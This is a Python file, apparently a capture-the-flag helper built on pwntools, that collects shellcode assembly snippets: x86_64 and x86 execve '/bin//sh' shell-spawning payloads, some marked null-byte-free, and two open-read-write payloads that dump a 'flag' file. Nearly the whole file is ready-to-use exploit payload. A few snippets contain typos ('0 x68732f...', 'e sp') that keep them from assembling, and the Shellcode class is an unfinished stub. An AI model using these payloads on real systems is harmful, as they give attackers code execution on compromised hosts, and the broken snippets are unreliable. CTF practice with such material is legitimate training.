#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import log

SHELLCODE = list()


class Shellcode(object):
    def __init__(self, os, tag=None, type=None):
        self.os = None
        self.tag = None
        self.type = None

    def search(self):
        pass


# ===
# === x86_64 getshell
# ===
SHELLCODE.append("""
;// os: x86_64
;// tag: standard
;// type: getshell
;// length: 31 bytes
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
xor rax, rax
push rax
mov rbx, 0x68732f2f6e69622f
push rbx
mov rdi, rsp
mov al, 0x3b
syscall
""")

SHELLCODE.append("""
;// os: x86_64
;// tag: standard
;// type: getshell
;// length: 22 bytes
xor rsi,rsi
mul esi
mov rbx,0x68732f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
""")

SHELLCODE.append("""
;// os: x86_64
;// tag: without_00
;// type: getshell
;// length: 23 bytes
xor rsi, rsi
mul esi
push rax
mov rbx,0 x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
""")


# ===
# === x86 getshell
# ===

SHELLCODE.append("""
;// os: x86
;// tag: standard
;// type: getshell
;// length: 23 bytes
xor ecx,ecx
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor eax,eax
mov al,0xB
int 0x80
""")

SHELLCODE.append("""
;// os: x86
;// tag: standard
;// type: getshell
;// length: 20 bytes
xor ecx, ecx
mul ecx
mov al, 0xb
push 0x68732f
push 0x6e69622f
mov ebx, esp
int 0x80
""")

SHELLCODE.append("""
;// os: x86
;// tag: without_00
;// type: getshell
;// length: 21 bytes
xor ecx,ecx
mul ecx
push eax
mov al, 0xb
push 0x68732f2f
push 0x6e69622f
mov ebx,e sp
int 0x80
""")


# ===
# === x86_64 orw
# ===

SHELLCODE.append("""
;// os: x86_64
;// tag: 
;// type: orw
;// length: 
sub rsp, 0x808
push 0x67616c66 ;// flag
mov rdi, rsp
xor esi, esi
mov eax, 2
syscall         ;// open

cmp eax, 0
js failed

mov edi, eax
mov rsi, rsp
mov edx, 0x100
xor eax, eax
syscall         ;// read

mov edx, eax
mov rsi, rsp
mov edi, 1
mov eax, edi
syscall         ;// write

jmp exit

failed:
push 0x6c696166
mov edi, 1
mov rsi, rsp
mov edx, 4
mov eax, edi
syscall         ;// stat

exit:
xor edi, edi
mov eax, 231
syscall         ;// exit_group
""")

SHELLCODE.append("""
;// os: x86_64
;// tag: 
;// type: orw
;// length: 
mov rax, 0x67616c662f2e ;// ./flag
push rax

mov rdi, rsp    ;// ./flag
mov rsi, 0      ;// O_RDONLY
xor rdx, rdx    ;
mov rax, 2      ;// SYS_open
syscall

mov rdi, rax    ;// fd 
mov rsi, rsp    ;
mov rdx, 1024   ;// nbytes
mov rax, 0      ;// SYS_read
syscall

mov rdi, 1      ;// fd 
mov rsi, rsp    ;// buf
mov rdx, rax    ;// count 
mov rax, 1      ;// SYS_write
syscall

mov rdi, 0      ;// error_code
mov rax, 60
syscall         ;// SYS_exit
""")
